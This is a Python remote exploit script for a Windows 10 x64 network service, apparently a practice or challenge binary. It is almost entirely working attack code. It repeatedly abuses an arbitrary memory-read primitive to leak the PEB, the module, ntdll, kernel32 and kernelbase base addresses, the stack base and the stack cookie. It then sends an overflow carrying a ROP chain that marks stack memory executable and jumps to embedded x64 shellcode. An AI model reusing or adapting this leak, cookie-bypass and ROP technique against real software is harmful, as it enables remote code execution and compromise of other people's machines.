# Tested on: Windows 10 x64 20H1
# Author : VS (JustaT3ch)

import struct
import socket

stack = []
stack_addresses = []

# store the stack values in order to restore the execution after the hijacking is done
stack_to_restore = []

# Shellcode source: https://www.exploit-db.com/shellcodes/49819
payload = b""
payload +=  b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
payload +=  b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
payload +=  b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
payload +=  b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
payload +=  b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
payload +=  b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
payload +=  b"\x48\x83\xec\x20\x41\xff\xd6"

def addr(res):

    peb = bytearray(res)
    peb.reverse()
    peb = bytes(peb).hex()
    return peb


def read_stack():


    elements = []

    for i in range(1, 20000):

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        data = b"\x41"*0x200
        data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"              # mov rax, qword[rcx]
        data += struct.pack("Q", int(stack_base, 16) - (i * 8))
    
        sock.send(header)

        sock.send(data)
        res = sock.recv(1024)

        stack_val = addr(res)
        stack.append(stack_val)

        if(stack_val == "4141414141414141"):

            # save the stack value to restore the execution later
            for j in range(8,25):
                stack_to_restore.append(stack[i-j-1])

            saved_stack = b""
            
            for val in stack_to_restore:
                saved_stack += struct.pack("Q", int(val, 16))

            elements.append(saved_stack)    # save the list of saved stack value
            
            # get the cookie value from the stack
            cookie_value = stack[i - 6]
            print("Cookie value: " + cookie_value)
            elements.append(cookie_value)   # save the cookie value
            return elements
    


host = "10.0.0.5"
port = 54321


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

header   =  b"\x45\x6b\x6f\x32\x30\x31\x39\x00"
msg_size =  b"\xff\xff\xff\xff\x00\x00\x00\x00"

header += msg_size

sock.send(header)

########################################################################################################

#leaking PEB address

data = b"\x41"*0x200
data += b"\x65\x00\x00\x00\x00\x00\x00\x00" # mov rax, qword gs:[rcx]
data += b"\x60\x00\x00\x00\x00\x00\x00\x00" # PEB offset 0x60 in TEB

sock.send(data)
res = sock.recv(1024)

peb_addr = addr(res)

print("PEB address: " + peb_addr)

########################################################################################################

# leaking PEB_LDR_DATA --> offset 0x18 on 64 bit

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"

peb_ldr = int(peb_addr, 16) + 24
data += struct.pack("Q", peb_ldr)

sock.send(data)
res = sock.recv(1024)
peb_ldr = addr(res)

########################################################################################################

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"

in_loaded_modules = int(peb_ldr, 16) + 16

data += struct.pack("Q", in_loaded_modules)

sock.send(data)
res = sock.recv(1024)
module_ldr_data = addr(res)

########################################################################################################

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"         
data += struct.pack("Q", int(module_ldr_data, 16))

sock.send(data)
res = sock.recv(1024)
ntdll_ldr_data = addr(res)

########################################################################################################

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"            
data += struct.pack("Q", int(ntdll_ldr_data, 16))

sock.send(data)
res = sock.recv(1024)
kernel_ldr_data = addr(res)

########################################################################################################

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"            
data += struct.pack("Q", int(kernel_ldr_data, 16))

sock.send(data)
res = sock.recv(1024)
kernelbase_ldr_data = addr(res)

########################################################################################################

# Module Base address 

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"         
data += struct.pack("Q", int(module_ldr_data, 16) + 48)


sock.send(data)
res = sock.recv(1024)
module_base = addr(res)
print("module_base :" + module_base)

########################################################################################################

# NTDLL Base address 

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"          
data += struct.pack("Q", int(ntdll_ldr_data, 16) + 48)


sock.send(data)
res = sock.recv(1024)
ntdll_base = addr(res)
print("ntdll_base :" + ntdll_base)

########################################################################################################

# Kernel32 Base address 

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"         
data += struct.pack("Q", int(kernel_ldr_data, 16) + 48) 

sock.send(data)
res = sock.recv(1024)
kernel32_base = addr(res)
print("kernel32_base :" + kernel32_base)

########################################################################################################

# Kernelbase Base address 

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.send(header)

data = b"\x41"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00"         
data += struct.pack("Q", int(kernelbase_ldr_data, 16) + 48) 

sock.send(data)
res = sock.recv(1024)
kernelbase_base = addr(res)
print("kernelbase_base :" + kernelbase_base)

########################################################################################################

# Leaking stack base

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

data = b"\x41"*0x200
data += b"\x65\x00\x00\x00\x00\x00\x00\x00" # gs access
data += b"\x08\x00\x00\x00\x00\x00\x00\x00"

sock.send(header)

sock.send(data)
res = sock.recv(1024)

stack_base = addr(res)
print("stack base address: " + stack_base) 

########################################################################################################

elements = read_stack()
    
########################################################################################################

lpaddr = struct.pack("Q", int(stack_base, 16) - 8192)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))


header   =  b"\x45\x6b\x6f\x32\x30\x31\x39\x00"
msg_size =  b"\xff\xff\xff\xff\x00\x00\x00\x00"

header += msg_size

sock.send(header)

data = b"\x46"*0x200
data += b"\x3e\x00\x00\x00\x00\x00\x00\x00" # regular move
data += struct.pack("Q", int(module_base, 16) + 54496)   # 0xd4e0
data += b"\x41\x41\x41\x41\x41\x41\x41\x41"     # header
data += b"\x41\x41\x41\x41\x41\x41\x41\x41"     # size
data += struct.pack("Q", int(elements[1], 16))  # stack cookie
data += b"\x42"*16                              # padding

# stack pivot to go to the ROP chain past the saved stack value.
data += struct.pack("Q", int(ntdll_base, 16) + 1017323)   

data += elements[0]  # list of saved stack values 

data += b"\x45"*8    # padding
data += b"\x45"*8    # padding

# ROP chain

data += struct.pack("Q", int(ntdll_base, 16) + 108627)          # pop rcx ntdll       0x000000018001a853: pop rcx; ret;
data += lpaddr                                                  #     

data += struct.pack("Q", int(kernel32_base, 16) + 150930)       # pop rdx kernel32    0x0000000180024d92: pop rdx; ret;
data += struct.pack("Q", 0x2000)

data += struct.pack("Q", int(ntdll_base, 16) + 29219)           # pop r8  ntdll       0x0000000180007223: pop r8; ret;
data += struct.pack("Q", 0x40)

data += struct.pack("Q", int(ntdll_base, 16) + 574868)          # pop r9  ntdll       0x000000018008c544: pop r9; pop r10; pop r11; ret;
data += struct.pack("Q", int(stack_base, 16) - 8100)            # just some writable stack address

data += b"\x41\x41\x41\x41\x41\x41\x41\x41" # padding
data += b"\x41\x41\x41\x41\x41\x41\x41\x41" # padding

data += struct.pack("Q", int(kernel32_base, 16) + 113776)

# Stack pivot to point to the payload

data +=  struct.pack("Q", int(ntdll_base, 16) + 8969)  # 0x0000000180002309: add rsp, 0x28; ret;

data += b"\x41"*8   # padding
data += b"\x42"*8   # padding
data += b"\x43"*8   # padding
data += b"\x44"*8   # padding
data += b"\x45"*8   # padding

data += struct.pack("Q", int(kernelbase_base, 16) + 254150) # jmp rsp gadget , kernelbase

data += b"\x90"*40  # nops
data += payload

data += b"\x48\x81\xEC\xF0\x00\x00\x00\xC3" # return the stack pointer to the original stack position. sub rsp , 0xf0; ret

data += b"\x46"*3 # padding

sock.send(data)
res = sock.recv(1024)

sock.close()






